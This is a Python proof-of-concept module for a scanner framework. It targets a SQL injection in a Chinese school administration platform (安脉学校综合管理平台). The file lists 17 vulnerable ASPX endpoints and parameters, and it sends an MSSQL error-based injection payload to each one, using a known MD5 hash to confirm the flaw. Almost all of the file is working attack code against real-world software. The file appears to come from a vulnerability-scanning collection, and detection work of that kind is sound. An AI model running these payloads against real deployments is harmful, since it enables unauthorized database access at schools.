# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Anmai_0002'  # 平台漏洞编号，留空
    name = '安脉学校综合管理平台 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-04-14'  # 漏洞公布时间
    desc = '''
        安脉学校综合管理平台采用B/S结构.NET技术，支持IE/Google/火狐/360等主流浏览器，支持云平台，有多元化的用户群，进行统一身份论证，符合《教育管理信息化标准》的要求。
        安脉学校综合管理平台页面参数过滤不完整，导致SQL注入漏洞：
        "/Asset/House/HouseInfo_View.aspx?HouseID=1",
        "/Asset/House/HouseRebuild_view.aspx?HouseID=1",
        "/Asset/House/Newhexiao.aspx?hidsearch=search&housebelong=1",
        "/Edis/adminpara/SetGeneralComment.aspx?selgrade=1",
        "/Asset/Device/Device_Validate.aspx?PrepareNo=1",
        "/Asset/Field/fieldInfo_View.aspx?fieldenrolid=1",
        "/Asset/House/Admin_Photo.aspx?&Action=Modify&HouseID=1",
        "/Asset/Device/DeviceLeadSearch.aspx?hidsearch=search&outstoreid=1",
        "/Asset/Device/DeviceRebuildInfo_View.aspx?DeviceRebuildID=1",
        "/Asset/Device/DeviceSort_Lead_Detail.aspx?prepareNo=1",
        "/Asset/Device/DeviceSort_Lead_OK.aspx?hid_prepareno=1",
        "/Asset/Device/Admin_Photo.aspx?Action=Modify&HouseID=1",
        "/Asset/Device/DeviceCancelInfo_View.aspx?DeviceCancelID=1",
        "/Asset/Device/DeviceInputSearch.aspx?hidsearch=search&assetfactory=1",
        "/Asset/Device/DeviceLeadInfo_View.aspx?LeadID=1",
        "/Asset/House/Add_HouseSort.aspx?radiobutton=1&Action=Edit&HousetypeID=1",
        "/OA/news/viewAffiche.aspx?id=1"
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0107248'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '安脉学校综合管理平台'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7cf18915-8594-48df-8248-b1dbb1994c70'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # _Refer_  = http://www.wooyun.org/bugs/wooyun-2010-0107248
            urls = [
                "/Asset/House/HouseInfo_View.aspx?HouseID=1",
                "/Asset/House/HouseRebuild_view.aspx?HouseID=1",
                "/Asset/House/Newhexiao.aspx?hidsearch=search&housebelong=1",
                "/Edis/adminpara/SetGeneralComment.aspx?selgrade=1",
                "/Asset/Device/Device_Validate.aspx?PrepareNo=1",
                "/Asset/Field/fieldInfo_View.aspx?fieldenrolid=1",
                "/Asset/House/Admin_Photo.aspx?&Action=Modify&HouseID=1",
                "/Asset/Device/DeviceLeadSearch.aspx?hidsearch=search&outstoreid=1",
                "/Asset/Device/DeviceRebuildInfo_View.aspx?DeviceRebuildID=1",
                "/Asset/Device/DeviceSort_Lead_Detail.aspx?prepareNo=1",
                "/Asset/Device/DeviceSort_Lead_OK.aspx?hid_prepareno=1",
                "/Asset/Device/Admin_Photo.aspx?Action=Modify&HouseID=1",
                "/Asset/Device/DeviceCancelInfo_View.aspx?DeviceCancelID=1",
                "/Asset/Device/DeviceInputSearch.aspx?hidsearch=search&assetfactory=1",
                "/Asset/Device/DeviceLeadInfo_View.aspx?LeadID=1",
                "/Asset/House/Add_HouseSort.aspx?radiobutton=1&Action=Edit&HousetypeID=1",
                "/OA/news/viewAffiche.aspx?id=1"
            ]
            data = "+and+1=sys.fn_varbintohexstr(hashbytes('MD5','1234'))--"
            for url in urls:
                verify_url = self.target + url + data
                r = requests.get(verify_url)

                if r.status_code == 500 and '81dc9bdb52d04dc20036dbd8313ed055' in r.text:
                    #security_hole(arg + url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
